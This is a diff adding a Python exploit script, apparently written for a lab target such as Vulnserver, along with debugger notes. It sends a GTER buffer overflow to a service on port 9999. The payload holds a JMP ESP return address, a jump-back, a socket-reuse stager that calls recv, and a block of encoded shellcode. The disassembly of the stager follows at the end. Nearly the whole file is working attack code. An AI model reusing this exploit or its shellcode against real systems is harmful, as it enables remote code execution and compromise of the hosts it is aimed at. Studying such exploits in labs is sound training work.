@@ -1,0 +1,99 @@
+#!/usr/bin/python3
+
+import socket
+import struct
+import time
+import subprocess
+
+target_ip = "192.168.255.140"
+target_port = 9999
+
+def make_string(offset):
+    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" %offset
+    #junk = subprocess.check_output(cmd, shell=True)
+    jmp_esp = struct.pack("<I",0x625011af)
+    jmpback = b"\xe9\x60\xff\xff\xff"
+    recv_call = b"\x90\x54\x59\x66\x81\xE9\x7C\x02\x54\x5A\x66\x81\xEA\x04\x01\x52\x5C\x33\xD2\x52\x80\xC6\x02\x52\x54\x5A\x66\x81\xC2\x0C\x01\x52\xFF\x31\xE8\x94\x2B\x88\xFF"
+    junk = recv_call + b"\x90"*(offset - len(recv_call)) + jmp_esp + jmpback + b"C"*900
+    prepend = b"GTER "
+    crash_string = prepend + junk
+    return crash_string
+
+def exploit(crash_string):
+    buf =  b"\x90"*20
+    buf += b"\xbb\x91\xbb\xe6\x63\xdb\xcd\xd9\x74\x24\xf4\x5a\x33"
+    buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xcb\xb5\x04"
+    buf += b"\x96\x17\x21\x4a\x59\xe7\xb2\x2b\xd3\x02\x83\x6b\x87"
+    buf += b"\x47\xb4\x5b\xc3\x05\x39\x17\x81\xbd\xca\x55\x0e\xb2"
+    buf += b"\x7b\xd3\x68\xfd\x7c\x48\x48\x9c\xfe\x93\x9d\x7e\x3e"
+    buf += b"\x5c\xd0\x7f\x07\x81\x19\x2d\xd0\xcd\x8c\xc1\x55\x9b"
+    buf += b"\x0c\x6a\x25\x0d\x15\x8f\xfe\x2c\x34\x1e\x74\x77\x96"
+    buf += b"\xa1\x59\x03\x9f\xb9\xbe\x2e\x69\x32\x74\xc4\x68\x92"
+    buf += b"\x44\x25\xc6\xdb\x68\xd4\x16\x1c\x4e\x07\x6d\x54\xac"
+    buf += b"\xba\x76\xa3\xce\x60\xf2\x37\x68\xe2\xa4\x93\x88\x27"
+    buf += b"\x32\x50\x86\x8c\x30\x3e\x8b\x13\x94\x35\xb7\x98\x1b"
+    buf += b"\x99\x31\xda\x3f\x3d\x19\xb8\x5e\x64\xc7\x6f\x5e\x76"
+    buf += b"\xa8\xd0\xfa\xfd\x45\x04\x77\x5c\x02\xe9\xba\x5e\xd2"
+    buf += b"\x65\xcc\x2d\xe0\x2a\x66\xb9\x48\xa2\xa0\x3e\xae\x99"
+    buf += b"\x15\xd0\x51\x22\x66\xf9\x95\x76\x36\x91\x3c\xf7\xdd"
+    buf += b"\x61\xc0\x22\x71\x31\x6e\x9d\x32\xe1\xce\x4d\xdb\xeb"
+    buf += b"\xc0\xb2\xfb\x14\x0b\xdb\x96\xef\xdc\x24\xce\x10\x90"
+    buf += b"\xcd\x0d\xee\xad\xdf\x9b\x08\xc7\xcf\xcd\x83\x70\x69"
+    buf += b"\x54\x5f\xe0\x76\x42\x1a\x22\xfc\x61\xdb\xed\xf5\x0c"
+    buf += b"\xcf\x9a\xf5\x5a\xad\x0d\x09\x71\xd9\xd2\x98\x1e\x19"
+    buf += b"\x9c\x80\x88\x4e\xc9\x77\xc1\x1a\xe7\x2e\x7b\x38\xfa"
+    buf += b"\xb7\x44\xf8\x21\x04\x4a\x01\xa7\x30\x68\x11\x71\xb8"
+    buf += b"\x34\x45\x2d\xef\xe2\x33\x8b\x59\x45\xed\x45\x35\x0f"
+    buf += b"\x79\x13\x75\x90\xff\x1c\x50\x66\x1f\xac\x0d\x3f\x20"
+    buf += b"\x01\xda\xb7\x59\x7f\x7a\x37\xb0\x3b\x8a\x72\x98\x6a"
+    buf += b"\x03\xdb\x49\x2f\x4e\xdc\xa4\x6c\x77\x5f\x4c\x0d\x8c"
+    buf += b"\x7f\x25\x08\xc8\xc7\xd6\x60\x41\xa2\xd8\xd7\x62\xe7"
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, target_port))
+    response = s.recv(2048)
+    print(response.decode())
+    s.send(crash_string)
+    time.sleep(1)
+    s.send(buf)
+    s.close()
+
+def main():
+    offset = 151
+    crash_string = make_string(offset)
+    exploit(crash_string)
+
+if __name__ == "__main__":
+    main()
+
+'''
+socket info:
+
+00B7FA0C   00000080  €...  |Socket = 80
+00B7FA10   003E4A98  ˜J>.  |Buffer = 003E4A98
+00B7FA14   00001000  ...  |BufSize = 1000 (4096.)
+00B7FA18   00000000  ....  \Flags = 0
+
+
+54 59 66 81 E9 7C 02 54 5A 66 81 EA 04 01 52 5C 33 D2 52 80 C6 02 52 54 5A 66 81 C2 0C 01 52 FF
+31 E8 94 2B 88 FF
+
+00B7F972   54               PUSH ESP
+00B7F973   59               POP ECX
+00B7F974   66:81E9 7C02     SUB CX,27C
+00B7F979   54               PUSH ESP
+00B7F97A   5A               POP EDX
+00B7F97B   66:81EA 0401     SUB DX,104
+00B7F980   52               PUSH EDX
+00B7F981   5C               POP ESP
+00B7F982   33D2             XOR EDX,EDX
+00B7F984   52               PUSH EDX
+00B7F985   80C6 02          ADD DH,2
+00B7F988   52               PUSH EDX
+00B7F989   54               PUSH ESP
+00B7F98A   5A               POP EDX
+00B7F98B   66:81C2 0C01     ADD DX,10C
+00B7F990   52               PUSH EDX
+00B7F991   FF31             PUSH DWORD PTR DS:[ECX]
+00B7F993   E8 942B88FF      CALL <JMP.&WS2_32.recv>
+
+
